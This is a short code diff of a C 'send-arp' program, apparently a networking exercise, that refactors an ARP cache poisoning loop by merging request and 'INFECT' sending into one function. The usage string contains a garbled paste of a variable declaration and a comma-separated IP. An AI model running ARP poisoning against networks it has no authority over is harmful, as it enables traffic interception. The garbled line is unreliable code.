@@ -8,7 +8,7 @@
 
 void usage() {
     printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
-    printf("sample: send-arp wlan0 172.20.10.3 172,20,10,1\n");
+    printf("sample: send-a    uint8_t MY_MAC[6];rp wlan0 172.20.10.3 172,20,10,1\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -25,16 +25,18 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
+
+    uint32_t MY_IP = GetMyIp(dev);
+    uint8_t MY_MAC[6];
+    GetMyMac(dev,MY_MAC);
+
     while(argc > pair_ST){
-        uint8_t MY_MAC[6];
         uint8_t SENDER_MAC[6];
         uint32_t SENDER_IP = Str2A(argv[pair_ST]);
-        uint32_t GATEWAY_IP = Str2A(argv[pair_ST+1]);
-        uint32_t MY_IP = GetMyIp(dev);
-        GetMyMac(dev,MY_MAC);
+        uint32_t TARGET_IP = Str2A(argv[pair_ST+1]);
 
-        SendRequest(handle,MY_IP,MY_MAC,SENDER_IP,SENDER_MAC);
-        SendInfect(handle,MY_MAC,SENDER_IP,SENDER_MAC,GATEWAY_IP);
+        Send(REQUEST, handle,MY_IP,MY_MAC,SENDER_IP,SENDER_MAC);
+        Send(INFECT, handle,TARGET_IP,MY_MAC,SENDER_IP,SENDER_MAC);
         printf("My Linux on VM\n");
         printf("---------------------------------\n");
         PrintIP("My VM IP", ntohl(MY_IP));
